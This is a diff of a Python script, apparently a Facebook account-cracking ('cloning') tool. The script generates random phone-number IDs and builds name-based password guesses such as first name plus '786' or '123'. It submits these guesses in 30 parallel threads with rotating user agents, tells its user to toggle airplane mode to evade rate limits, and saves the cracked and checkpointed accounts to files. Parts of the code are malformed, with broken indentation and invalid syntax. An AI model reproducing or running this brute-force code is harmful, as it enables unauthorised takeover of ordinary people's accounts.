@@ -70,8 +70,8 @@ kk = '\033[33m'
 b = '\33[1;96m' 
 p = '\x1b[0;34m' 
 # Converter 
-dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}
-dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Agustus','09':'September','10':'October','11':'November','12':'December'}
+dic = {'1':'Jan','2':'Feb','3':'Mar','4':'Ap','5':'May','6':'Jun','7':'July','8':'Agus','9':'Sep','10':'Oct','11':'Nov','12':'Dec'}
+dic2 = {'01':'Jan','02':'Feb','03':'Mar','04':'Apr','05':'May','06':'Jun','07':'Jul','08':'Agus','09':'Sep','10':'Oct','11':'Nov','12':'Dec'}
 tgl = datetime.datetime.now().day
 bln = dic[(str(datetime.datetime.now().month))]
 thn = datetime.datetime.now().year
@@ -203,107 +203,86 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print (' [!] Choose Correct Option')
-		exit()
-	clear()
-	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 [BEST] \033[1;97m')
-	hc = input ("\n [+] Method : ")
-	if hc in ['1','01']:
-		method.append('mobile')
-	elif hc in ['2','02']:
-		method.append('free')
-	else:
-		method.append('mobile')
-	passmenu()
-def passmenu():
-	clear()
-	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] FULL NAME PASS')
-	passmen=input('\n [#] Select Pass : ')
-	if passmen in ['1','01']:
-		first()
-	elif passmen in ['2','02']:
-		name()
-	elif passmen in ['3','03']:
-		name2()
-	else:
-		passmenu()
-		
-def first():
-	clear()
-	print(logo);print( '\n\033[1;94m [!] BRUTE  HAS BEEN START \n\033[1;96m [!] Turn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0],last = nmf.split(' ')[1]
-			pwv = (frs +last)
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(nmf)
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
-			if 'mobile' in method:
-				pool.submit(crack,idf,pwv)
-			elif 'free' in method:
-				pool.submit(free,idf,pwv)
-			else:
-				pool.submit(crack,idf,pwv)
-def name():
-	clear()
-	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			try:
-				idf,nmf = yuzong.split('|')
-				xz = nmf.split(' ')
-				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
-				else:
-					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
-				if 'mobile' in method:
-					pool.submit(crack,idf,pwv)
-				elif 'free' in method:
-					pool.submit(free,idf,pwv)
-				else:
-					pool.submit(crack,idf,pwv)
-			except:
-				pass
-def name2():
-	clear()
-	print(logo);print( '\n [!] OK Result Saved To : \033[1;92mOK.txt/%s\033[1;97m\n [!] CP Result Saved To : \033[1;91mCP.txt/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
-			pwv = ['445566']
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(nmf)
-					pwv.append(frs+'123')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'786')
-			if 'mobile' in method:
-				pool.submit(crack,idf,pwv)
-			elif 'free' in method:
-				pool.submit(free,idf,pwv)
-			else:
-				pool.submit(crack,idf,pwv)
+			print(f"{B} \ \33[0;96m[✓] Crack password manual/default {P}M/D")
+			ter =input(f"{P}\   Choose : {P}")
+			if ter in ["m","M"]:
+				print(f"{B}   \{M} Only Support M-Pass !!");exit()
+				exit()
+			elif ter in ["d","D"]:
+				with ThreadPoolExecutor(max_workers=30) as coeg:
+					started()
+					for user in id:
+						uid, name = user.split("|")
+						frist=name.split(" ")
+						if len(frist)>=6:
+							fii = [ name ]
+						elif len(frist)<=2:
+							fii = [ name ]
+						elif len(frist)<=3:
+							fii = [ name ]
+						else:
+							fii = [ name ]
+
+						coeg.submit(apiiii, uid, fii)
+				exit()
+
+elif mrbaloch in ["3","03"]:
+		print(f"{B} \ \33[0;96m[✓] Apply Cp Detector {P}Y/t")
+		_start_=input(f"{P}\   Choose : {P}")
+		if _start_ in ["t","T"]:
+			print(f"{B}   \{M} Ok Godby !!");exit()
+
+		else:
+			print(f"{B} \ \33[0;96m[✓] Crack password manual/default {P}M/D")
+			ter =input(f"{P}\   Choose : {P}")
+			if ter in ["m","M"]:
+				print(f"{B}   \{M} Only Support M-Pass !!");exit()
+				exit()
+			elif ter in ["d","D"]:
+				with ThreadPoolExecutor(max_workers=30) as coeg:
+					started()
+					for user in id:
+						uid, name = user.split("|")
+						frist=name.split(" ")
+						if len(frist)>=6:
+							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
+						elif len(frist)<=2:
+							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
+						elif len(frist)<=3:
+							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
+						else:
+							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345", "khankhan", "786786" ]
+						coeg.submit(apiiii, uid, fii)
+				exit()
+				
+	elif mrbaloch in ["2","02"]:
+		print(f"{B} \ \33[0;96m[✓] Apply Cp Detector {P}Y/t")
+		_start_=input(f"{P}\   Choose : {P}")
+		if _start_ in ["t","T"]:
+			print(f"{B}   \{M} Ok Godby !!");exit()
+
+		else:
+			print(f"{B} \ \33[0;96m[✓] Crack password manual/default {P}M/D")
+			ter =input(f"{P}\   Choose : {P}")
+			if ter in ["m","M"]:
+				print(f"{B}   \{M} Only Support M-Pass !!");exit()
+				exit()
+			elif ter in ["d","D"]:
+				with ThreadPoolExecutor(max_workers=30) as coeg:
+					started()
+					for user in id:
+						uid, name = user.split("|")
+						frist=name.split(" ")
+						if len(frist)>=6:
+							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
+						elif len(frist)<=2:
+							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
+						elif len(frist)<=3:
+							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
+						else:
+							fii = [ name, frist[0]+"786", frist[0]+"123", frist[0]+"1234", frist[0]+"12345" ]
+						coeg.submit(apiiii, uid, fii)
+				exit()
 	
 # CRACKER
 def crack(idf,pwv):
@@ -394,14 +373,15 @@ logo = """
  
     
 
-   888    d8P   888       888    8888888b.        
-   888   d8P    888       888    888   "Y88b       
-   888  d8P     888       888    888     888           
-   888d88K      8888888888888    888     888    
-   8888888b     888       888    888     888      
-   888  Y88b    888.      888    888     888      
-   888   Y88b   888       888    888  . d88P       
-   888    Y88b  888       888.   8888888P" 302                                                                             
+888    d8P   888       888    8888888b.        
+888   d8P    888       888    888   "Y88b       
+888  d8P     888       888    888     888           
+888d88K      8888888888888    888     888    
+8888888b     888       888    888     888      
+888  Y88b    888.      888    888     888      
+888   Y88b   888       888    888  . d88P       
+888    Y88b  888       888.   8888888P" 302
+                                                                               
 \x1b[1;97m--------------------------------------------------
 \33[1;41mKHD-302 X RSU BRAND REAL FATHER OF HITTLER\33[0m
 \x1b[1;97m--------------------------------------------------
@@ -412,6 +392,7 @@ logo = """
 \x1b[1;97m[+] VERSION        :\x1b[1;97m 0.1  \x1b[1;97m          
 \x1b[1;97m--------------------------------------------------
 """
+ 
 class Main:
 	def __init__(self):
 		self.id = []
@@ -422,7 +403,7 @@ class Main:
 		print(logo)
 		print("")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
-		print("\033[1;37mNOTE : Approval LIKE FB PAGE ")
+		print("\033[1;37mNOTE : FOR APROVAL LIKE FB PAGE ")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ")
 		
 		
@@ -471,11 +452,10 @@ class Main:
 			time.sleep(1)
 			Main()
  
-def old(self):
-		x = -1111111
-		xx = -9999999
-		idx = input("%s [?] PAK NUM COD:%s "%(G,Y))
-
+	def old(self):
+		x = 1111111
+		xx = 9999999
+		idx = input("[+]ENTER PAK NUM COD: ")
 		os.system('clear');print(logo)
 		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
@@ -483,6 +463,7 @@ def old(self):
 				_ = random.randint(x,xx)
 				__ = idx
 				self.id.append(__+str(_))
+			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
 				print("\n\033[1;32m [!] Exemple(123456 786786 112233 445566) FOR IDZ\033[1;37m ")
@@ -495,7 +476,7 @@ def old(self):
 				print("     \033[0;93m   WELCOME TO FB CLONING WORLD")
 				print("\n\033[0;94m [+] START CLONING")
 				print(" \033[0;96m[+] NOTE: CP IDZ OPEN IN 15 DAYS")
-				print(" [!] IF NO RESULTS USE AEROPLANE FOR 10 SECOND")
+				print(" [!] ~Use Flight Mode 5 Second After Every 10 mint~")
 				print("\033[0;94m----------------------------------------------")
 				print("\n")
 				print("\033[1;37m")
@@ -504,7 +485,7 @@ def old(self):
 			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using my tool...")
 		except Exception as e:exit(str(e))
  
-def api(self, uid, pwx):
+	def api(self, uid, pwx):
 		rua = random.choice([
 		"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 			  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
@@ -902,7 +883,7 @@ def api(self, uid, pwx):
  
 		self.loop +=1
  
-def old2(self):
+	def old2(self):
 		x = 1111111111
 		xx = 9999999999
 		idx = "1000" 
@@ -926,7 +907,7 @@ def old2(self):
 				print("     \033[0;93m   WELCOME TO FB CLONING WORLD")
 				print("\n\033[0;94m [+] STARTING CLONING")
 				print(" \033[0;96m[+] NOTE: CP IDZ OPEN IN 15 DAYS")
-				print(" [!] IF NO RESULTS USE AEROPLANE FOR 10 SECOND")
+				print(" [!] ~Use Flight Mode 5 Second After Every 10 mint~")
 				print("\033[0;94m--------------------------------------------")
 				print("\n")
 				print("\033[1;37m")
@@ -935,7 +916,7 @@ def old2(self):
 			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[THANKS FOR USING OUR TOOL...")
 		except Exception as e:exit(str(e))
  
-def api(self, uid, pwx):
+	def api(self, uid, pwx):
 		rua = random.choice([
 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 			  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
